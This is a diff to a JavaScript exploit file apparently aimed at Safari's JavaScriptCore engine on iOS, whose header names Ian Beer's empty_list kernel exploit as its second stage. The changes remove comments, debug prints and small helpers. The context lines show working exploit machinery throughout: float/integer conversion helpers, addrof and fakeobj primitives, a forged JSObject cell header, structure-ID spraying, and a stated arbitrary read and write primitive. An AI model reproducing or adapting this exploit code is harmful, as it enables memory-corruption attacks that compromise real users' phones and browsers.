@@ -5,10 +5,8 @@
  * The second stage is currently Ian Beer's empty_list kernel exploit,
  * adapted to use getattrlist() instead of fgetattrlist().
  *
- * Thanks to qwerty for some Mach-O tricks.
- *
- * Offsets hardcoded for iPhone 8, iOS 11.3.1.
  */
+
 print = alert
 ITERS = 10000
 ALLOCS = 1000
@@ -27,23 +25,6 @@ function i2f(i) {
     i32[0] = i % BASE32
     i32[1] = i / BASE32
     return f64[0]
-}
-
-function hexit(x) {
-    if (x < 0)
-        return `-${hex(-x)}`
-    return `0x${x.toString(16)}`
-}
-
-function xor(a, b) {
-    var res = 0, base = 1
-    for (var i = 0; i < 64; ++i) {
-        res += base * ((a&1) ^ (b&1))
-        a = (a-(a&1))/2
-        b = (b-(b&1))/2
-        base *= 2
-    }
-    return res
 }
 
 function fail(x) {
@@ -132,10 +113,9 @@ function pwn(binary) {
     var hax = new Uint8Array(0x1000);
 
     // Create fake JSObject.
-    // print("[*] Setting up container object");
 
     var jsCellHeader = new Int64([
-        00, 0x10, 00, 00,       // m_structureID, current guess.
+        0x0, 0x10, 0x0, 0x0,    // m_structureID, current guess.
                                 // JSC allocats a set of structures for non-JSObjects (Executables, regular expression objects, ...)
                                 // during start up. Avoid these by picking a high initial ID.
         0x0,                    // m_indexingType, None
@@ -153,7 +133,6 @@ function pwn(binary) {
 
     // Create the fake Float64Array.
     var address = Add(stage1.addrof(container), 16);
-    // print("[*] Fake JSObject @ " + address);
 
     var fakearray = stage1.fakeobj(address);
 
@@ -167,10 +146,7 @@ function pwn(binary) {
         jsCellHeader.assignAdd(jsCellHeader, Int64.One);
         container.jsCellHeader = jsCellHeader.asJSValue();
     }
-
-    // Maybe shouldn't print stuff here.. :P
-    // print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));
-
+    
     //
     // We now have an arbitrary read+write primitive since we can overwrite the
     // data pointer of an Uint8Array with an arbitrary address.
